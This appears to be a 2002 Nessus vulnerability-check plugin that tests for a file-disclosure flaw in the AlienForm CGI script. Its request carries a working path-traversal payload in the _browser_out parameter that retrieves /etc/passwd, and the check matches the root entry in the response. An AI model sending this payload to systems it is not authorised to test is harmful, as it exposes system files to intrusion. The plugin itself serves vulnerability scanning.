#
# This script was written by Andrew Hintz ( http://guh.nu )
# 	and is based on code writen by Renaud Deraison
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11027);
 script_version("$Revision$");
 script_cve_id("CAN-2002-0934");
 script_bugtraq_id(4983);
 name["english"] = "AlienForm CGI script";
 script_name(english:name["english"]);
 
 desc["english"] = "The AlienForm CGI script allows an attacker
to view any file on the target computer, append arbitrary data 
to an existing file, and write arbitrary data to a new file.

The AlienForm CGI script is installed as either af.cgi or
alienform.cgi

For more details, please see:
http://online.securityfocus.com/archive/1/276248/2002-06-08/2002-06-14/0

Risk factor : Medium/High
Solution : Disable AlienForm";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks if the AlienForm CGI script is vulnerable";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2002 Andrew Hintz (http://guh.nu)");

 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");



port = get_kb_item("Services/www");
if(!port) port = 80;

if(!get_port_state(port))exit(0);

if(http_is_dead(port:port))exit(0);


http_keepalive_enabled(port:port);



foreach dir (cgi_dirs())
{
afcgi[0] = "af.cgi";
afcgi[1] = "alienform.cgi";

for(d=0;afcgi[d];d=d+1)
{
   req = string(dir, "/", afcgi[d], "?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd");
   req = http_get(item:req, port:port);
   result = http_keepalive_send_recv(port:port, data:req);
   if(result == NULL)exit(0);
   if(egrep(pattern:"root:.*:0:[01]:.*", string:result)){
   	security_hole(port);
	exit(0);
	}
}
}
